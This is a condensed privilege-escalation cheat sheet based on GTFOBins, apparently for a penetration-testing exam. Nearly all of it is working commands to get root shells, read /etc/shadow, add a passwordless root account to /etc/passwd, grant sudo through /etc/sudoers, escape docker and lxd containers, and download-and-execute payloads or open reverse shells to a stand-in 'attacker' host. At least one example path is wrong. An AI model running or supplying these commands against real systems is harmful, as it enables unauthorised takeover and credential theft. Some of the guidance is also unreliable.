# GTFOBins - Condensed Reference

> The full GTFOBins corpus lives at https://gtfobins.github.io. **Before the exam, clone the GitHub repo (`git clone https://github.com/GTFOBins/GTFOBins.github.io.git`) and zip it for upload to CRESTDrive** — the markdown files in `_gtfobins/` contain every binary and every technique.
>
> This file is a condensed quick-reference of the binaries you are most likely to need, organised by exploitation context. For binaries not listed here, refer to the full corpus.

## How to use this reference

When you find a SUID binary, a sudo entry, a binary with capabilities, or you are restricted to running specific commands, look up the binary here and execute the matching technique.

The contexts are:

- **Shell**: spawn an interactive shell from the binary
- **Sudo**: when running via `sudo /path/to/binary`, become root
- **SUID**: when the binary has the SUID bit set (`-rwsr-xr-x`), become the owner
- **Capabilities**: when the binary has Linux capabilities (e.g. `cap_setuid+ep`), exploit them
- **File read**: read arbitrary files (often files only readable by root)
- **File write**: write arbitrary files (often files only writable by root)
- **Limited SUID**: SUID binary that drops privs - use `-p` flag (preserve EUID)

For SUID exploitation, the same command pattern that works for "Shell" usually works with `-p` added to the spawned shell to preserve the elevated EUID.

---

## The Top 30 Binaries (Memorise These)

### awk

```bash
# Shell
awk 'BEGIN {system("/bin/sh")}'

# Sudo
sudo awk 'BEGIN {system("/bin/sh")}'

# SUID
./awk 'BEGIN {system("/bin/sh -p")}'

# File read
awk '//' /etc/shadow

# File write
LFILE=file_to_write
awk -v RS='a^' "BEGIN{printf \"data\"}" > $LFILE
```

### bash

```bash
# Shell (already a shell, but to drop priv-keeping)
bash -p

# Sudo
sudo bash

# SUID (the -p flag preserves EUID)
./bash -p

# Capabilities (cap_setuid+ep)
./bash -p

# File read
LFILE=/etc/shadow
bash -c 'echo "$(<'"$LFILE"')"'
```

### cat

```bash
# File read (the obvious one)
cat /etc/shadow

# Sudo file read
sudo cat /etc/shadow
```

### chmod

```bash
# Sudo: make any file world-rwx, including /etc/shadow
sudo chmod 777 /etc/shadow

# Sudo: make /bin/bash SUID
sudo chmod +s /bin/bash
```

### cp

```bash
# Sudo: overwrite /etc/passwd with attacker-controlled file
echo 'rooted::0:0:root:/root:/bin/bash' >> /tmp/passwd
sudo cp /tmp/passwd /etc/passwd
su rooted     # no password

# Or copy /etc/shadow to readable location
sudo cp /etc/shadow /tmp/shadow
sudo chmod 644 /tmp/shadow
```

### cpulimit

```bash
# Sudo
sudo cpulimit -l 100 -f -- /bin/sh -p
```

### curl

```bash
# Sudo / SUID file read (using local file URL)
curl file:///etc/shadow
sudo curl file:///etc/shadow

# Sudo file write
TF=$(mktemp)
echo "DATA" > $TF
sudo curl file://$TF -o /etc/passwd

# Download and execute
sudo curl http://attacker/payload.sh | sudo sh
```

### dd

```bash
# File read (sudo)
sudo dd if=/etc/shadow

# File write (sudo) - overwrite /etc/passwd
echo 'rooted::0:0::/root:/bin/bash' | sudo dd of=/etc/passwd
```

### dpkg

```bash
# Sudo - install a malicious deb package
TF=$(mktemp -d)
mkdir -p "$TF/DEBIAN"
cat > "$TF/DEBIAN/control" << EOF
Package: x
Version: 1.0
Section: misc
Priority: optional
Architecture: all
Maintainer: x
Description: x
EOF
cat > "$TF/DEBIAN/postinst" << EOF
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x "$TF/DEBIAN/postinst"
dpkg-deb -b "$TF" /tmp/x.deb
sudo dpkg -i /tmp/x.deb
/bin/bash -p
```

### env

```bash
# Shell
env /bin/sh
sudo env /bin/sh
./env /bin/sh -p          # SUID
```

### find

```bash
# Shell
find . -exec /bin/sh \; -quit

# Sudo
sudo find . -exec /bin/sh \; -quit

# SUID (with -p to preserve EUID)
./find . -exec /bin/sh -p \; -quit

# File read via -readable
find / -name shadow 2>/dev/null
find /etc -name shadow -exec cat {} \;
```

### gcc

```bash
# Shell
gcc -wrapper /bin/sh,-s .

# Sudo
sudo gcc -wrapper /bin/sh,-s .
```

### gdb

```bash
# Shell
gdb -nx -ex '!sh' -ex quit

# Sudo
sudo gdb -nx -ex '!sh' -ex quit

# SUID
./gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit

# File read
gdb --batch --ex 'shell cat /etc/shadow'
```

### git

```bash
# Shell (via PAGER abuse - long output triggers pager)
git -p help status     # then !/bin/sh in less

# Or set PAGER
GIT_PAGER='exec /bin/sh 0<&1' git -p help

# Sudo
sudo git -p help

# Sudo file read
sudo git help config        # then !cat /etc/shadow in less

# SUID via core.sshCommand (newer git)
git config --global --replace-all core.sshCommand "/bin/sh"
git pull anything           # triggers core.sshCommand
```

### grep

```bash
# File read
sudo grep '' /etc/shadow

# SUID
./grep '' /etc/shadow
```

### iconv

```bash
# File read (any sudo or SUID)
sudo iconv -f 8859_1 -t 8859_1 /etc/shadow
LFILE=/etc/shadow
./iconv -f 8859_1 -t 8859_1 "$LFILE"

# File write
echo DATA | sudo iconv -f 8859_1 -t 8859_1 -o /etc/passwd
```

### less / more

```bash
# Shell (from inside)
less /etc/passwd
# Then in less: !/bin/sh

# Or directly
less /etc/passwd
!/bin/sh

# Sudo - read any file
sudo less /etc/shadow
# Then !/bin/sh inside less for shell

# Same for more, most, vi, vim
```

### man

```bash
# Shell from man pager
man man      # then !/bin/sh inside

# Sudo
sudo man man   # then !/bin/sh
```

### nano / pico

```bash
# Shell - Ctrl+R Ctrl+X then type a command:
# Inside nano: ^R then ^X then:
reset; sh 1>&0 2>&0

# Sudo
sudo nano
^R^X
reset; sh 1>&0 2>&0

# Or set up with VAR
nano -s /bin/sh
```

### ncat / nc

```bash
# Shell
nc -e /bin/sh attacker 4444     # if -e supported (most systems no)

# OpenBSD nc workaround
mkfifo /tmp/f; nc attacker 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1

# Sudo file read
sudo nc -lp 4444 < /etc/shadow
# attacker: nc target 4444

# File write
echo DATA | sudo nc -lp 4444 > /etc/passwd
```

### nmap

```bash
# Older nmap interactive mode (rare on modern Kali but try if you see old nmap)
nmap --interactive
nmap> !sh

# Modern: --script
echo 'os.execute("/bin/sh -p")' > /tmp/x.nse
sudo nmap --script=/tmp/x.nse
```

### nohup

```bash
# Shell
sudo nohup /bin/sh
./nohup /bin/sh -p           # SUID
```

### perl

```bash
# Shell
perl -e 'exec "/bin/sh";'

# Sudo
sudo perl -e 'exec "/bin/sh";'

# SUID/Capabilities (cap_setuid+ep)
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# File read
perl -e 'open($f, "/etc/shadow"); while(<$f>) { print "$_"; }'
```

### pip

```bash
# Sudo - install evil package
TF=$(mktemp -d)
echo "import os; os.system('chmod +s /bin/bash')" > $TF/setup.py
sudo pip install $TF
/bin/bash -p
```

### python (and python2/python3)

```bash
# Shell
python -c 'import os; os.system("/bin/sh")'
python -c 'import pty; pty.spawn("/bin/sh")'

# Sudo
sudo python -c 'import os; os.system("/bin/sh")'

# SUID
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Capabilities (cap_setuid+ep) - the killer one
./python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# File read
python -c 'print(open("/etc/shadow").read())'
```

### rsync

```bash
# Shell
rsync -e 'sh -c "sh 0<&2 1>&2"' x .

# Sudo
sudo rsync -e 'sh -c "sh 0<&2 1>&2"' x .
```

### ruby

```bash
# Shell
ruby -e 'exec "/bin/sh"'

# Sudo
sudo ruby -e 'exec "/bin/sh"'

# Capabilities (cap_setuid+ep)
./ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

### scp

```bash
# Shell - via -S flag (specify alternate program)
scp -S /tmp/sh.sh x y:           # /tmp/sh.sh is your script

# Or with O option
scp -o ProxyCommand="sh -i 0<&2 1>&2" x y:
```

### sed

```bash
# Shell
sed -n '1e exec sh 1>&0' /etc/hosts

# Sudo
sudo sed -n '1e exec sh 1>&0' /etc/hosts

# SUID file read
./sed -n '1,$p' /etc/shadow
```

### sh / dash / ash

```bash
# All of these spawn a shell
sh
sudo sh
./sh -p          # SUID
```

### socat

```bash
# Shell
socat exec:/bin/sh stdio
socat readline exec:'/bin/sh',pty,stderr,setsid,sigint,sane

# Sudo
sudo socat tcp-listen:4444,reuseaddr,fork exec:/bin/sh
```

### ssh

```bash
# Sudo - via ProxyCommand
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x

# File read - via known_hosts manipulation isn't general; the cleanest:
sudo ssh -o "PermitLocalCommand=yes" -o "LocalCommand=cat /etc/shadow" attacker@127.0.0.1
```

### strace

```bash
# Shell (sudo)
sudo strace -o /dev/null /bin/sh

# SUID
./strace -o /dev/null /bin/sh -p
```

### sudo

```bash
# Sudo (requires you to already have sudo!) - escalation chains
sudo -i                                # become root if you have ALL=ALL

# Privilege escalation when you have sudo for a specific command:
# sudo -l first to see what's allowed
sudo -l

# CVE-2019-14287 (sudo < 1.8.28) - bypass user restriction
sudo -u#-1 /bin/bash                   # if Runas_Spec includes !root

# CVE-2021-3156 (Baron Samedit) - heap overflow
# Exploit script needed; affects sudo 1.8.2 - 1.9.5p1
```

### tar

```bash
# Shell - using checkpoint actions
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# Sudo
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# Wildcard injection - if `tar *` is in a cron as root:
echo '#!/bin/bash' > exploit.sh
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' >> exploit.sh
chmod +x exploit.sh
touch -- '--checkpoint-action=exec=sh exploit.sh'
touch -- '--checkpoint=1'
# Wait for cron, then /tmp/rb -p
```

### tee

```bash
# File write (sudo)
echo 'rooted::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd

# Useful for appending to /etc/sudoers
echo 'user ALL=(ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers
```

### vi / vim / nvim

```bash
# Shell (the classic)
vim
:!/bin/sh
# or
:set shell=/bin/sh
:shell

# Or directly
vim -c ':!/bin/sh'

# Sudo
sudo vim -c ':!/bin/sh'
sudo vi -c ':!/bin/sh'

# File read
sudo vim /etc/shadow

# File write
sudo vim /etc/passwd
# Add: rooted::0:0::/root:/bin/bash
# Save: :wq

# Vim with capabilities (cap_setuid+ep)
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash","bash")'
```

### wget

```bash
# Sudo - file read via local URL
sudo wget file:///etc/shadow -O -

# Sudo file write - overwrite system file from server
sudo wget http://attacker/passwd -O /etc/passwd

# Sudo download and execute
sudo wget http://attacker/exploit.sh -O - | sudo sh
```

### xargs

```bash
# Shell
xargs -a /dev/null sh
sudo xargs -a /dev/null sh
./xargs -a /dev/null sh -p              # SUID
```

### zip

```bash
# Shell - via --unzip-command
zip /tmp/x.zip /etc/hosts -T --unzip-command="sh -c /bin/sh"

# Sudo
sudo zip /tmp/x.zip /etc/hosts -T --unzip-command="sh -c /bin/sh"
```

---

## Container Escapes

### docker

If you are in the `docker` group:

```bash
# Mount host filesystem and chroot
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Or use any image you have, e.g. ubuntu
docker run --rm -it -v /:/mnt ubuntu chroot /mnt /bin/bash

# Privileged container with host network
docker run --rm -it --privileged --network host -v /:/host alpine chroot /host

# If you need to find images
docker images
```

### lxd / lxc

If you are in the `lxd` group:

```bash
# 1. Build a small Alpine image (or import one)
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine

# 2. Import
lxc image import ./alpine-*.tar.gz --alias myimg

# 3. Init container with privileged mode and root mount
lxc init myimg ignite -c security.privileged=true
lxc config device add ignite mydev disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite -- /bin/sh
# Now /mnt/root is the host filesystem
chroot /mnt/root /bin/bash
```

---

## Capability Quick Lookup

When you find a binary with capabilities (`getcap -r / 2>/dev/null`):

| Capability | Risk | Exploit |
|---|---|---|
| `cap_setuid+ep` on python/perl/ruby/node | **Critical (= SUID root)** | Call `setuid(0)` then exec a shell |
| `cap_setuid+ep` on bash | **Critical** | `./bash -p` |
| `cap_dac_read_search+ep` | Read any file | Read /etc/shadow, SSH keys, etc. |
| `cap_dac_override+ep` | Read/write any file | Write to /etc/passwd, /etc/shadow |
| `cap_sys_admin+ep` | Mount filesystems, many privesc paths | Highly capability-specific |
| `cap_sys_ptrace+ep` | Attach to any process | Inject into a privileged process |
| `cap_chown+ep` | chown any file | chown /etc/shadow to current user |
| `cap_fowner+ep` | Bypass perms on operations on files | Read/manipulate owned-by-root files |
| `cap_net_bind_service+ep` | Bind to ports < 1024 | Usually benign |
| `cap_net_raw+ep` | Raw sockets (e.g. for ping) | Usually benign |

---

## SUID Hunting Pattern

```bash
# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Find SGID binaries
find / -perm -g=s -type f 2>/dev/null

# Both
find / -perm /6000 -type f 2>/dev/null

# Recently-modified SUID (potentially custom)
find / -perm -u=s -type f -mtime -30 2>/dev/null

# After finding suspicious SUID, check GTFOBins for that binary
```

The non-default SUID binaries are most interesting. Default Linux SUIDs include:
`/usr/bin/su`, `/usr/bin/passwd`, `/usr/bin/sudo`, `/usr/bin/chsh`, `/usr/bin/chfn`, `/usr/bin/gpasswd`, `/usr/bin/newgrp`, `/usr/bin/mount`, `/usr/bin/umount`, `/bin/ping`, `/usr/bin/pkexec` (often), `/usr/bin/fusermount`, `/usr/lib/openssh/ssh-keysign`, `/usr/lib/eject/dmcrypt-get-device`.

Anything *outside* the standard set is a candidate for exploitation.

---

## Sudo `-l` Reading Pattern

When `sudo -l` shows entries:

```
User user may run the following commands on host:
    (root) NOPASSWD: /usr/bin/find
    (root) PASSWD: /bin/cat /var/log/*
    (operator) /bin/ls
```

Read each entry:

1. **(user)** - the user to run as. `(root)` is what you want.
2. **NOPASSWD** vs **PASSWD** - whether you need the user's own password.
3. **The command** - exact path and any wildcards.

Then look up that command in this reference. The wildcard cases are particularly fruitful:

- `/bin/cat /var/log/*` allows `sudo /bin/cat /var/log/../etc/shadow` (the `*` matches `..`-paths)
- `/bin/tar *` allows the wildcard injection from the `tar` entry above

Always look up the exact binary, even if it seems innocuous - you would be amazed how many "harmless" binaries have GTFOBins entries.

---

## Common SUID-to-Root in Order of Likelihood

When you find an SUID binary, try in this order (likelihood × ease):

1. `bash -p`, `dash -p`, `sh -p`
2. `python -c 'import os; os.setuid(0); os.system("/bin/bash")'`
3. `perl -e 'use POSIX; setuid(0); exec "/bin/bash"'`
4. `find . -exec /bin/sh -p \; -quit`
5. `awk 'BEGIN{system("/bin/sh -p")}'`
6. `vim -c ':!/bin/sh -p'`
7. Custom SUID binaries: run `strings` on them, look for hardcoded paths or commands that might be hijackable via `$PATH` or unquoted arguments

---

## Final Notes

- Always start with `sudo -l` and `find / -perm -u=s -type f 2>/dev/null` and `getcap -r / 2>/dev/null` on any new Linux foothold.
- For binaries not in this condensed list, the full GTFOBins corpus (in your CRESTDrive offline copy) has them.
- The pattern `binary -p` (preserve EUID) is the magic for SUID exploitation - try it first before reaching for fancier techniques.
